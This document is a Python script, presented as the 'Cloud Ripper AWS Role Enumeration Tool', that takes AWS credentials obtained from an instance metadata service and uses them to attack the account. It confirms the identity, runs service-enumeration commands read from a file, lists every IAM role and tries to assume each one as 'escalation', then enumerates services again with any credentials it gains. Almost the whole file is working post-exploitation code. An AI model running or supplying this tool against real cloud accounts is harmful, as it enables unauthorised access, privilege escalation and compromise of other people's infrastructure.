#Cloud Ripper AWS Role Enumeration Tool 
# Arnab Roy -arnab@cybernix.co.uk
#!/usr/bin/env python3
import json,time,sys,os,subprocess
dictFile="enum.txt"
aws_region="us-east-1"

print ("Enter the AWS API Credentials from Meta Data Service")
print ("Enter AWS ACCESS KEY ID")
access_key_id=str(input())
print ("Enter AWS SECRET ACCESS KEY")
secret_key=str(input())
print ("Enter AWS Session Token")
sess_token=str(input())
os.environ["AWS_ACCESS_KEY_ID"]=access_key_id
os.environ["AWS_SESSION_TOKEN"]=sess_token
os.environ["AWS_DEFAULT_REGION"]=aws_region
os.environ["AWS_SECRET_ACCESS_KEY"]=secret_key
cmd='aws sts get-caller-identity'
sts_out=subprocess.check_output(cmd, shell=True)
sts_out_json=json.loads(sts_out)
instance_role_name=""
if(sts_out):
    arn=sts_out_json["Arn"]
    print("\nAPI Connection established, obtained Instance Profile "+arn)
    instance_role_name=str(arn.split('/')[1].strip())
    print("Obtained Instance Role for potential enumeration attack...."+instance_role_name)
    print ("Starting AWS Service enumeration with Initial Access Keys..")
    time.sleep(3)
    with open(dictFile) as enum_file:
        for line in enum_file:
            try:
                cmd=str(line.split(',')[0].strip())
                tag=str(line.split(',')[1].strip())
                
                try:
                    subprocess.check_output(cmd, shell=True)
                    print ("Initial Service enumeration [OK] for :"+tag+" CMD: "+cmd)
                except:
                    print ("Initial Serivce enumeration [FAILED] "+tag+" CMD: "+cmd)    
            except:
                continue        
    cmd="aws iam list-roles"
    roles_out=subprocess.check_output(cmd, shell=True)
    roles_out_json=json.loads(roles_out)
      
    for each in roles_out_json['Roles']:
            
            try:
                cmd='aws iam get-role --role-name '+str(each['RoleName'])
                elv_roles_out=subprocess.check_output(cmd, shell=True)
                elv_roles_out_json=json.loads(elv_roles_out)
                elv_roles_arn=elv_roles_out_json['Role']['Arn']
                print ("Attempting escalation using "+elv_roles_out_json['Role']['Arn'])
                try:
                    cmd='aws sts assume-role --role-arn "'+elv_roles_arn+'" --role-session-name "Boom"'
                    esc_status=subprocess.check_output(cmd, shell=True)
                    if esc_status:
                        esc_json=json.loads(esc_status)
                        print ('\nRole Migration Successfull Assumed Role [SUCCESS]: '+elv_roles_out_json['Role']['RoleName']+"\n")
                        time.sleep(5)
                        os.environ["AWS_ACCESS_KEY_ID"]=esc_json['Credentials']['AccessKeyId']
                        os.environ["AWS_SECRET_ACCESS_KEY"]=esc_json['Credentials']['SecretAccessKey']
                        os.environ["AWS_SESSION_TOKEN"]=esc_json['Credentials']['SessionToken']
                        with open(dictFile) as enum_file:
                            for line in enum_file:
                                try:
                                    cmd=str(line.split(',')[0].strip())
                                    tag=str(line.split(',')[1].strip())
                                    
                                    try:
                                        subprocess.check_output(cmd, shell=True)
                                        print ("Service enumeration [OK] for :"+tag+" CMD: "+cmd)
                                        time.sleep(5)
                                    except:
                                        print ("Service enumeration [FAILED] "+tag+" CMD: "+cmd)
                                except:
                                    continue
                    print ('Finished Enumerating all services for: '+elv_roles_out_json['Role']['RoleName'])
                    time.sleep(5)
                    os.environ["AWS_ACCESS_KEY_ID"]=access_key_id
                    os.environ["AWS_SESSION_TOKEN"]=sess_token
                    os.environ["AWS_DEFAULT_REGION"]=aws_region
                    os.environ["AWS_SECRET_ACCESS_KEY"]=secret_key
                except:
                    print ('Role Migration [FAILED] : '+elv_roles_out_json['Role']['RoleName'])                                
            except:
                print ('Unable to describe role : '+elv_roles_out_json['Role']['RoleName'])
             
                
else:
    print("API connection failed bailing")
    exit
